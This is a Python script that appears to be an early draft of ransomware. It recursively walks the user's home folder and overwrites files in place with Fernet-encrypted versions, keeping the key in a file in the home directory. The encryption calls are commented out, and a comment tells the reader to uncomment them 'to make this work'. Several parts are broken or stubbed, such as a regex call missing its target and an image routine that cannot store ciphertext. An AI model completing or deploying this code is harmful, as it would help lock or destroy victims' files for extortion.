from decimal import DivisionByZero
from cryptography.fernet import Fernet
import imageio.v2 as imageio
import os, re, numpy

def encrypt_users(path):
    for files in os.listdir(path):
        if os.path.isdir(path + "\\" + files):
            encrypt_users(path + "\\" + files)
        else:
            if re.findall(".png|.jpg|.jpeg|.jpe|.jif|.jfif|.jfi|.gif|.tiff|.tif|.webp|.psd|.raw|.arw|.cr2|.nrw|.k25|.svg|.svgz|.bmp|.dib|.heif|.heic"):
                #encrypt_image(path)
                pass
            else:
                #encrypt_file(path + "\\" + files) 
                pass #remove this and uncomment the call to encrypt_file to make this work.

def encrypt_file(path):
    with open((os.path.expanduser("~") + "\\key.txt"), "rb") as file:
        key = file.read()
    fernet = Fernet(key)
    try:
        with open(path) as file:
            original = bytes(file.read(), "utf-8")
        encrypted = fernet.encrypt(original)
        with open(path, "wb") as file:
            file.write(encrypted)
    except:
        pass

def decrypt_file(path):
    with open((os.path.expanduser("~") + "\\key.txt"), "rb") as file:
        key = file.read()
    fernet = Fernet(key)
    try:
        with open(path) as file:
            encrypted = file.read()
        original = fernet.decrypt(encrypted)
        with open(path, "w") as file:
            file.write(original.decode())
    except:
        pass

def decrypt_users(path):
    for files in os.listdir(path):
        if os.path.isdir(path + "\\" + files):
            decrypt_users(path + "\\" + files)
        else:
            if re.findall(".png|.jpg|.jpeg|.jpe|.jif|.jfif|.jfi|.gif|.tiff|.tif|.webp|.psd|.raw|.arw|.cr2|.nrw|.k25|.svg|.svgz|.bmp|.dib|.heif|.heic"):
                #decrypt_image(path)
                pass
            else:
                #decrypt_file(path + "\\" + files) 
                pass #remove this and uncomment the call to encrypt_file to make this work.

def encrypt_image(path):
    with open((os.path.expanduser("~") + "\\key.txt"), "rb") as file:
        key = file.read() #for now this program is just reading the key out of a file placed into main dir; change this before final version
    fernet = Fernet(key)
    try:
        with imageio.imopen(path, "r") as file:
            original = file.read()
            encrypted = numpy.copy(original)
        #encrypted = list(fernet.encrypt(original))
            for i in range(len(original)):
                for j in range(len(original[i])):
                    for k in range(len(original[i][j])):
                        encrypted[i][j][k] = fernet.encrypt(bytes(original[i][j][k]))
        with imageio.imopen(path, "w") as file:
            file.write(encrypted)
    except DivisionByZero:
        pass


def bytearray_to_bytes():
    pass

def decrypt_image():
    pass

def generate_key():
    key = Fernet.generate_key()
    with open((os.path.expanduser("~") + "\\key.txt"), "wb") as file:
        file.write(key)

def main():
    #print(os.listdir(os.path.expanduser("~")))
    #encrypt_users(os.path.expanduser("~"))
    #generate_key()
    encrypt_image("harambe.jpg")
    #decrypt_file("tiger.png")

if __name__ == "__main__":
    main()